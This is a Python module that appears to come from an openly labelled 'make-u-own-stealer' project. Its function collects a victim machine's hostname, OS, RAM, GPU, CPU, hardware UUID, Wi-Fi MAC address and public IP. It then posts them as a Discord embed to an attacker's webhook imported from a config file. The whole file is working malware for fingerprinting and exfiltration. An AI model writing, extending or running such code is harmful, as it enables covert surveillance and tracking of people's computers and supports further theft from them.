import requests, wmi, subprocess, psutil, platform, json
from config import hook

def get_mac_address():
    for interface, addrs in psutil.net_if_addrs().items():
        if interface == "Wi-Fi":
            for addr in addrs:
                if addr.family == psutil.AF_LINK:
                    mac = addr.address
                    return mac

def machineinfo():

    mem = psutil.virtual_memory()

    c = wmi.WMI()
    for gpu in c.Win32_DisplayConfiguration():
        GPUm = gpu.Description.strip()

    current_machine_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
    
    reqip = requests.get("https://api.ipify.org/?format=json").json()
              
    mac = get_mac_address()
          
    payload = {
        "embeds": [
            {
                "title": "Machine Info",
                "username": "github.com/lawxsz",
                "avatar_url": "https://cdn.discordapp.com/attachments/1073683220148785222/1077827511691530240/photo_2022-10-01_18-57-36.jpg",
                "description": "Github.com/Lawxsz/make-u-own-stealer",
                "fields": [
                    {
                        "name": ":computer: PC",
                        "value": f"`{platform.node()}`",
                        "inline": True
                    },
                    {
                        "name": ":desktop: OS:",
                        "value": f"`{platform.platform()}`",
                        "inline": True
                    },
                    {
                        "name": ":wrench: RAM",
                        "value": f"`{mem.total / 1024**3} GB`",
                        "inline": True
                    },
                    {
                        "name": ":pager: GPU",
                        "value": f"`{GPUm}`",
                        "inline": True
                    },
                    {
                        "name": ":zap: CPU",
                        "value": f"`{platform.processor()}`",
                        "inline": True
                    },
                    {
                        "name": ":key: HWID",
                        "value": f"`{current_machine_id}`",
                        "inline": True
                    },
                    {
                        "name": ":label: MAC",
                        "value": f"`{mac}`",
                        "inline": True
                    },
                    {
                        "name": ":crossed_swords: IP",
                        "value": f"`{reqip['ip']}`",
                        "inline": True
                    }
                ]
            }
        ]
    }     

    headers = {
        "Content-Type": "Application/Json"
    }
    r = requests.post(hook, data=json.dumps(payload), headers=headers)

